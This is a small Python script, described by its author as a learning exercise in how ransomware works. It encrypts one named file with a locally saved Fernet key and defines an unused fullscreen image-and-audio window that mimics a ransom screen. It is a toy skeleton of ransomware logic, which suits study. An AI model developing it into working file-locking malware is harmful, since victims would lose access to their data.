#This Code was maded only for edicational and learning purposes, i wanted to learn how ransomware works 
import pygame
import os
import sys
from cryptography.fernet import Fernet 

#generate and save key
key = Fernet.generate_key()
with open("key.key", "wb") as file_key:
    file_key.write(key)

#load key
loaded_key = Fernet(key)

#Read original file
with open("prueba.txt", "rb") as f:
    original_data = f.read()

#encrypt data, fernet is gonna to encrypt the content in the variable "original_data" using the loaded key
encrypted_data = loaded_key.encrypt(original_data)

#save encrypted file
with open("documento.txt.encrypted", "wb") as f_encrypted:
    f_encrypted.write(encrypted_data)

def fazwin():
    pygame.init() #init pygame
    pygame.mixer.init() #init pygame audio module
 # create window
    wind = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    pygame.display.set_caption("")
 #load img and music
    fazbear_img = pygame.image.load("./assets/img.jpg")
    pygame.mixer.music.load("./assets/aud.mp3")
    pygame.mixer.music.play(-1)
    execute_win = True
    # window loop
    while execute_win:
        for x in pygame.event.get():
            if x.type == pygame.QUIT:
                execute_win = False
     #load window
        wind.fill((0, 0, 0)) 
        wind.blit(fazbear_img, (0, 0))
        pygame.display.flip()
    pygame.quit()
